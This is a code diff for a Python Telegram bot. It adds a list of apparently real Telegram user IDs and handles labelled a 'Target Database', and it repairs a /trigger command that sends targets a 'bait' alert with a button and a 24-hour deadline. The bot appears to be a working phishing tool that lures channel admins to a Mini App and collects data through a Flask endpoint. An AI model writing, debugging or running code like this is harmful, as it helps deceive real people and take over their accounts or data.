@@ -8,6 +8,14 @@ ADMIN_ID = 8699819680
 LOG_CHANNEL = -1003817774248
 TMA_URL = "https://pawsofjoy.github.io/tma-research/" 
 
+# Put your targets back here so /list works
+TARGETS = {
+    "71117894651": "@Extreme_pressure",
+    "76663888074": "@BNBwebina",
+    "81271111961": "@adsgram_update",
+    "8699819680": "@Akun_Dev"
+}
+
 bot = TeleBot(TOKEN)
 app = Flask(__name__)
 CORS(app)
@@ -26,21 +34,24 @@ def receive_data():
 @app.route('/')
 def home(): return "Bot is Alive", 200
 
+@bot.message_handler(commands=['list'])
+def handle_list(message):
+    if message.from_user.id == ADMIN_ID:
+        response = "<b>Target Database:</b>\n\n"
+        for uid, username in TARGETS.items():
+            response += f"👤 {username}\nID: <code>{uid}</code>\n\n"
+        bot.send_message(ADMIN_ID, response, parse_mode="HTML")
+
 @bot.message_handler(commands=['trigger'])
 def handle_trigger(message):
     if message.from_user.id == ADMIN_ID:
         try:
-            # Cleans up any accidental line breaks or extra spaces
+            # Fixes the 'strip' error by processing the text correctly
             clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
-            
-            # Splitting by @
-            parts = clean_text.split('@')
+            parts = [p.strip() for p in clean_text.split('@')]
             
             if len(parts) == 3:
-                target_id = parts.strip()
-                channel_name = parts.strip()
-                admin_name = parts.strip()
-                
+                target_id, channel_name, admin_name = parts
                 deadline = (datetime.datetime.now() + datetime.timedelta(hours=24)).strftime("%B %d, %H:%M UTC")
                 
                 markup = types.InlineKeyboardMarkup()
@@ -57,7 +68,7 @@ def handle_trigger(message):
                 bot.send_message(target_id, bait, parse_mode="HTML", reply_markup=markup)
                 bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name} for {channel_name}")
             else:
-                bot.send_message(ADMIN_ID, "❌ Format error. Use:\n<code>/trigger ID @ Channel @ Name</code>", parse_mode="HTML")
+                bot.send_message(ADMIN_ID, "❌ Use: /trigger ID @ Channel @ Name")
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")
 
